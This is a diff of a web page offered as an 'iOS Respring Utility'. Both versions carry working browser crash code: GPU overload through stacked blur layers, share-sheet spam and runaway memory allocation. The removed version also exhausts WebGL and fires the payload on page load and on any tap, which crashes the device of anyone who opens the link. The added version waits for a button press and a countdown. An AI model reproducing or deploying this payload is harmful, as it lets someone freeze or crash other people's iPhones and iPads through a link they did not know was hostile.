@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <title>respring</title>
-        <meta name="description" content="instant respring for iOS devices">
+        <title>iOS Respring Utility</title>
+        <meta name="description" content="Respring utility for iOS devices"/>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta property="og:title" content="respring">
-        <meta property="og:description" content="instant respring for iOS devices">
+        <meta property="og:title" content="iOS Respring Utility">
+        <meta property="og:description" content="Respring utility for iOS devices">
         <meta property="og:url" content="https://jailbreak.party/respring">
         <meta name="theme-color" content="#0074fb">
         <style>
@@ -28,6 +28,7 @@
                 color: #ffffff;
             }
 
+            /* Glowing Gradient Mesh Background */
             .gradient-bg {
                 position: absolute;
                 inset: 0;
@@ -41,6 +42,7 @@
                 filter: blur(90px);
                 opacity: 0.65;
                 animation: float 10s ease-in-out infinite alternate;
+                transition: background 0.8s ease;
             }
 
             .orb-1 {
@@ -71,11 +73,27 @@
                 animation-duration: 10s;
             }
 
-            @keyframes float {
-                0% { transform: translate(0px, 0px) scale(1); }
-                100% { transform: translate(30px, -40px) scale(1.15); }
+            /* Unsupported Mode Orb Background */
+            body.unsupported-mode .orb-1 {
+                background: radial-gradient(circle, #f43f5e 0%, #be123c 100%);
+            }
+            body.unsupported-mode .orb-2 {
+                background: radial-gradient(circle, #fb923c 0%, #c2410c 100%);
+            }
+            body.unsupported-mode .orb-3 {
+                background: radial-gradient(circle, #e11d48 0%, #881337 100%);
             }
 
+            @keyframes float {
+                0% {
+                    transform: translate(0px, 0px) scale(1);
+                }
+                100% {
+                    transform: translate(30px, -40px) scale(1.15);
+                }
+            }
+
+            /* Ambient Background Grid Overlay */
             .grid-overlay {
                 position: absolute;
                 inset: 0;
@@ -85,6 +103,7 @@
                 opacity: 0.4;
             }
 
+            /* Glassmorphism Card Container */
             .card {
                 position: relative;
                 z-index: 10;
@@ -92,7 +111,8 @@
                 backdrop-filter: blur(24px);
                 -webkit-backdrop-filter: blur(24px);
                 border: 1px solid rgba(255, 255, 255, 0.12);
-                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 40px rgba(0, 116, 251, 0.25);
+                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                            0 0 40px rgba(0, 116, 251, 0.25);
                 border-radius: 28px;
                 padding: 44px 32px;
                 width: 90%;
@@ -102,9 +122,56 @@
                 flex-direction: column;
                 align-items: center;
                 gap: 24px;
-                cursor: pointer;
+                transition: all 0.5s ease;
             }
 
+            .card.unsupported-card {
+                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                            0 0 40px rgba(244, 63, 94, 0.3);
+                border-color: rgba(244, 63, 94, 0.25);
+            }
+
+            /* Step 1: Trigger Button */
+            .input-group {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .confirm-btn {
+                width: 100%;
+                padding: 14px 20px;
+                background: linear-gradient(135deg, #0074fb 0%, #7c3aed 100%);
+                border: none;
+                border-radius: 14px;
+                color: #ffffff;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                box-shadow: 0 4px 20px rgba(0, 116, 251, 0.4);
+                transition: all 0.3s ease;
+            }
+
+            .confirm-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 25px rgba(0, 116, 251, 0.6);
+            }
+
+            .confirm-btn:active {
+                transform: translateY(0);
+            }
+
+            /* Step 2: Loading UI Container */
+            .loading-container {
+                width: 100%;
+                display: none;
+                flex-direction: column;
+                align-items: center;
+                gap: 24px;
+            }
+
+            /* Dual Spinning Ring Loader */
             .spinner-container {
                 position: relative;
                 width: 80px;
@@ -145,10 +212,37 @@
                 animation: pulse 1.5s ease-in-out infinite alternate;
             }
 
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            @keyframes spin-reverse { 0% { transform: rotate(0deg); } 100% { transform: rotate(-360deg); } }
-            @keyframes pulse { 0% { transform: scale(0.8); opacity: 0.7; } 100% { transform: scale(1.25); opacity: 1; } }
+            /* Step 3: Unsupported Error Icon */
+            .error-icon {
+                display: none;
+                width: 72px;
+                height: 72px;
+                border-radius: 50%;
+                background: rgba(244, 63, 94, 0.12);
+                border: 1px solid rgba(244, 63, 94, 0.3);
+                align-items: center;
+                justify-content: center;
+                color: #fb7185;
+                font-size: 32px;
+                box-shadow: 0 0 25px rgba(244, 63, 94, 0.3);
+            }
 
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            @keyframes spin-reverse {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(-360deg); }
+            }
+
+            @keyframes pulse {
+                0% { transform: scale(0.8); opacity: 0.7; }
+                100% { transform: scale(1.25); opacity: 1; }
+            }
+
+            /* Typography */
             .text-group h1 {
                 font-size: 1.5rem;
                 font-weight: 700;
@@ -163,8 +257,10 @@
                 font-size: 0.875rem;
                 color: rgba(255, 255, 255, 0.6);
                 letter-spacing: 0.01em;
+                line-height: 1.4;
             }
 
+            /* 5-Second Smooth Progress Bar */
             .progress-bar-track {
                 width: 100%;
                 height: 6px;
@@ -176,20 +272,17 @@
 
             .progress-bar-fill {
                 position: absolute;
-                top: 0; left: 0;
-                height: 100%; width: 50%;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 0%;
                 background: linear-gradient(90deg, #0074fb, #ec4899, #06b6d4);
                 border-radius: 10px;
-                animation: shimmer 1.8s ease-in-out infinite;
                 box-shadow: 0 0 14px rgba(0, 116, 251, 0.8);
+                transition: width 5s linear;
             }
 
-            @keyframes shimmer {
-                0% { left: -50%; width: 30%; }
-                50% { width: 60%; }
-                100% { left: 100%; width: 30%; }
-            }
-
+            /* Status Pill Badge */
             .status-badge {
                 display: inline-flex;
                 align-items: center;
@@ -203,6 +296,12 @@
                 font-weight: 500;
             }
 
+            .status-badge.error {
+                background: rgba(244, 63, 94, 0.15);
+                border-color: rgba(244, 63, 94, 0.3);
+                color: #fb7185;
+            }
+
             .status-dot {
                 width: 6px;
                 height: 6px;
@@ -212,28 +311,14 @@
                 animation: pulse 1s infinite alternate;
             }
 
-            .copyright-footer {
-                position: absolute;
-                bottom: 20px;
-                left: 50%;
-                transform: translateX(-50%);
-                z-index: 20;
-                font-size: 0.75rem;
-                color: rgba(255, 255, 255, 0.6);
-                display: flex;
-                align-items: center;
-                gap: 6px;
-                white-space: nowrap;
-                text-align: center;
-            }
-
-            .copyright-footer a {
-                color: rgba(255, 255, 255, 0.85);
-                text-decoration: underline;
+            .status-badge.error .status-dot {
+                background-color: #fb7185;
+                box-shadow: 0 0 8px #fb7185;
             }
         </style>
     </head>
     <body>
+        <!-- Glowing Gradient Background -->
         <div class="gradient-bg">
             <div class="orb orb-1"></div>
             <div class="orb orb-2"></div>
@@ -241,135 +326,137 @@
         </div>
         <div class="grid-overlay"></div>
 
-        <div class="card" id="triggerCard">
-            <div class="spinner-container">
-                <div class="spinner-ring-outer"></div>
-                <div class="spinner-ring"></div>
-                <div class="center-glow"></div>
+        <!-- Glassmorphism Card Container -->
+        <div class="card" id="card">
+            
+            <!-- STEP 1: Direct Respring Trigger Section -->
+            <div class="input-group" id="inputStep">
+                <div class="text-group">
+                    <h1>iOS Respring Utility</h1>
+                    <p>Press the button below to trigger a respring sequence.</p>
+                </div>
+                <button id="confirmBtn" class="confirm-btn">Respring</button>
             </div>
 
-            <div class="text-group">
-                <h1>respring</h1>
-                <p id="statusText">Tap anywhere to trigger respring</p>
+            <!-- STEP 2: Loading State Section -->
+            <div class="loading-container" id="loadingStep">
+                <div class="spinner-container">
+                    <div class="spinner-ring-outer"></div>
+                    <div class="spinner-ring"></div>
+                    <div class="center-glow"></div>
+                </div>
+
+                <div class="text-group">
+                    <h1 id="userGreeting">Preparing Respring</h1>
+                    <p id="description">Initiating system memory reset procedure...</p>
+                </div>
+
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progressBarFill"></div>
+                </div>
+
+                <div class="status-badge" id="statusBadge">
+                    <span class="status-dot"></span>
+                    <span id="statusText">Respring in 5s...</span>
+                </div>
             </div>
 
-            <div class="progress-bar-track">
-                <div class="progress-bar-fill"></div>
+            <!-- STEP 3: Unsupported Platform Screen (Shown if non-iOS) -->
+            <div id="unsupportedStep" style="display: none; flex-direction: column; align-items: center; gap: 24px; width: 100%;">
+                <div class="error-icon" id="errorIcon" style="display: flex;">
+                    &#9888;&#xFE0F;
+                </div>
+                <div class="text-group">
+                    <h1>Unsupported Platform</h1>
+                    <p>This utility requires an iOS device (iPhone or iPad) to function.</p>
+                </div>
+                <div class="status-badge error">
+                    <span class="status-dot"></span>
+                    <span>iOS Device Required</span>
+                </div>
             </div>
 
-            <div class="status-badge">
-                <span class="status-dot"></span>
-                Tap screen if auto-trigger fails
-            </div>
         </div>
 
-        <!--  big credit to @neonmodder123  -->
-        <iframe id="frame" style="width: 1px;height: 1px;" srcdoc="
-                &lt;html&gt;
-                &lt;body&gt;
-                    &lt;script&gt;
-                        const container = document.createElement('div');
-                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                        document.body.appendChild(container);
-    
-                        for (let i = 0; i &lt; 500; i++) {
-                            let d = document.createElement('div');
-                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
-                            container.appendChild(d);
-                        }
-    
-                        setInterval(() =&gt; {
-                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() =&gt; {});
-                            let x = new Uint8Array(1024 * 1024 * 10);
-                            crypto.getRandomValues(x);
-                        }, 0);
-                    &lt;/script&gt;
-                &lt;/body&gt;
-                &lt;/html&gt;
-            " sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
-        
+        <!-- Footer Copyright Section -->
+        <div style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 20; font-size: 0.8rem; color: rgba(255, 255, 255, 0.7); text-align: center; white-space: nowrap;">
+            © 2026 iAnyFeature (Leo7247), All Rights Reserved <a href="https://leo7247.github.io/copyright" style="color: inherit; text-decoration: underline; margin-left: 6px;">Click Here To Learn More</a>
+        </div>
+
         <script>
-            const frame = document.getElementById('frame');
-            const respringScript = `
-                <html>
-                <body>
-                    <script>
-                        const container = document.createElement('div');
-                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                        document.body.appendChild(container);
-    
-                        for (let i = 0; i < 500; i++) {
-                            let d = document.createElement('div');
-                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
-                            container.appendChild(d);
-                        }
-    
-                        setInterval(() => {
-                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
-                            let x = new Uint8Array(1024 * 1024 * 10);
-                            crypto.getRandomValues(x);
-                        }, 0);
-                    <\/script>
-                </body>
-                </html>
-            `;
-            frame.srcdoc = respringScript;
-
-            // Aggressive Heavy Overload Payload
-            function runHeavyPayload() {
-                document.getElementById('statusText').innerText = "Executing respring...";
-                
-                // 1. CSS GPU Overload
-                const container = document.createElement('div');
-                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%; position: absolute; inset: 0; pointer-events: none; z-index: -1;';
-                document.body.appendChild(container);
-
-                for (let i = 0; i < 800; i++) {
-                    let d = document.createElement('div');
-                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
-                    container.appendChild(d);
-                }
-
-                // 2. WebGL Canvas Context Exhaustion (Forces GPU driver crash)
-                for (let i = 0; i < 100; i++) {
-                    try {
-                        let c = document.createElement('canvas');
-                        c.width = 4096;
-                        c.height = 4096;
-                        let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                        if (gl) {
-                            let tex = gl.createTexture();
-                            gl.bindTexture(gl.TEXTURE_2D, tex);
-                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-                        }
-                    } catch(e){}
-                }
-
-                // 3. Unthrottled Synchronous Memory Allocation & Share API Bomb
-                const memoryBuffers = [];
-                function panicLoop() {
-                    for (let i = 0; i < 50; i++) {
-                        try {
-                            memoryBuffers.push(new Uint8Array(1024 * 1024 * 20)); // Allocate 20MB per loop
-                            navigator.share({ title: 'R', text: 'R'.repeat(200000) }).catch(() => {});
-                        } catch(e){}
-                    }
-                    setTimeout(panicLoop, 0);
-                }
-                panicLoop();
+            // iOS / iPadOS Detection
+            function isIOS() {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                const isStandardIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+                const isIPadOS = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
+                return isStandardIOS || isIPadOS;
             }
 
-            // Auto-run on load
-            window.addEventListener('DOMContentLoaded', runHeavyPayload);
+            const inputStep = document.getElementById('inputStep');
+            const loadingStep = document.getElementById('loadingStep');
+            const unsupportedStep = document.getElementById('unsupportedStep');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const statusText = document.getElementById('statusText');
 
-            // User gesture fallback (tapping screen guarantees full permission to share/WebGL APIs)
-            document.addEventListener('touchstart', runHeavyPayload);
-            document.addEventListener('click', runHeavyPayload);
+            // Detect non-iOS platform on page load
+            if (!isIOS()) {
+                document.body.classList.add('unsupported-mode');
+                document.getElementById('card').classList.add('unsupported-card');
+                inputStep.style.display = 'none';
+                unsupportedStep.style.display = 'flex';
+            }
+
+            // Function to handle confirmation and start 5s loading timer
+            function startRespringSequence() {
+                // Transition UI from initial to loading
+                inputStep.style.display = 'none';
+                loadingStep.style.display = 'flex';
+
+                // Smooth 5-second progress bar animation
+                requestAnimationFrame(() => {
+                    progressBarFill.style.width = '100%';
+                });
+
+                // Countdown indicator
+                let secondsLeft = 5;
+                statusText.innerText = `Respring in ${secondsLeft}s...`;
+
+                const interval = setInterval(() => {
+                    secondsLeft--;
+                    if (secondsLeft > 0) {
+                        statusText.innerText = `Respring in ${secondsLeft}s...`;
+                    } else {
+                        statusText.innerText = `Triggering respring...`;
+                        clearInterval(interval);
+                    }
+                }, 1000);
+
+                // Execute respring logic directly on main document for full GPU/Memory impact
+                setTimeout(() => {
+                    // Credit to @neonmodder123
+                    const container = document.createElement('div');
+                    container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%; position: absolute; inset: 0; z-index: 999999; pointer-events: none;';
+                    document.body.appendChild(container);
+
+                    for (let i = 0; i < 500; i++) {
+                        let d = document.createElement('div');
+                        d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                        container.appendChild(d);
+                    }
+
+                    setInterval(() => {
+                        if (navigator.share) {
+                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                        }
+                        let x = new Uint8Array(1024 * 1024 * 10);
+                        crypto.getRandomValues(x);
+                    }, 0);
+                }, 5000);
+            }
+
+            // Handle Respring button click
+            confirmBtn.addEventListener('click', startRespringSequence);
         </script>
-
-        <footer class="copyright-footer">
-            <span>© 2026 iAnyFeature (Leo7247,), All Rights Reserved</span>
-            <a href="https://leo7247.github.io/copyright">Click Here To Learn More</a>
-        </footer>
     </body>
 </html>
